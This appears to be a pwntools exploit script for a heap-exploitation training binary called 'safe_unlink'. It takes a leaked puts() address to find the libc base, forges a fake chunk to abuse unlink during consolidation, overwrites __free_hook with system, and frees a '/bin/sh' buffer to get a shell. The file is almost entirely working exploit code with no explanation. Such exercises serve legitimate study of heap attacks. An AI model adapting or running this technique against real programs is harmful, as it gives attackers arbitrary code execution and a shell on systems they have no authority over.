#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("safe_unlink")
libc = ELF(elf.runpath + b"/libc.so.6") # elf.libc broke again

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Index of allocated chunks.
index = 0

# Select the "malloc" option; send size.
# Returns chunk index.
def malloc(size):
    global index
    io.send(b"1")
    io.sendafter(b"size: ", f"{size}".encode())
    io.recvuntil(b"> ")
    index += 1
    return index - 1

# Select the "edit" option; send index & data.
def edit(index, data):
    io.send(b"2")
    io.sendafter(b"index: ", f"{index}".encode())
    io.sendafter(b"data: ", data)
    io.recvuntil(b"> ")

# Select the "free" option; send index.
def free(index):
    io.send(b"3")
    io.sendafter(b"index: ", f"{index}".encode())
    io.recvuntil(b"> ")

io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil(b"puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym.puts
io.recvuntil(b"> ")
io.timeout = 0.1

# =============================================================================

chunkA = malloc(0x88)
chunkB = malloc(0x88)
MARR = elf.sym.m_array
FD = MARR - 0x18 # BK + 24
BK = MARR - 0x10 # FD + 16
FAKE = 0x90
PREV = 0x80
payload = flat(
  p64(0),
  p64(PREV),
  FD,
  BK,
  b"\x00" * (0x60),
  PREV,
  FAKE,
)

# Prev inuse and clear flag 
edit(chunkA, payload)

# consolidate
free(chunkB)

# Change the m_array ptr to target
payload = flat(
  p64(0) * 3,
  libc.sym["__free_hook"] - 8
)
edit(chunkA, payload)

# Change target
payload = flat(
  b"/bin/sh\x00",
  libc.sym["system"]
)

edit(chunkA, payload)
free(chunkA)

# =============================================================================

io.interactive()
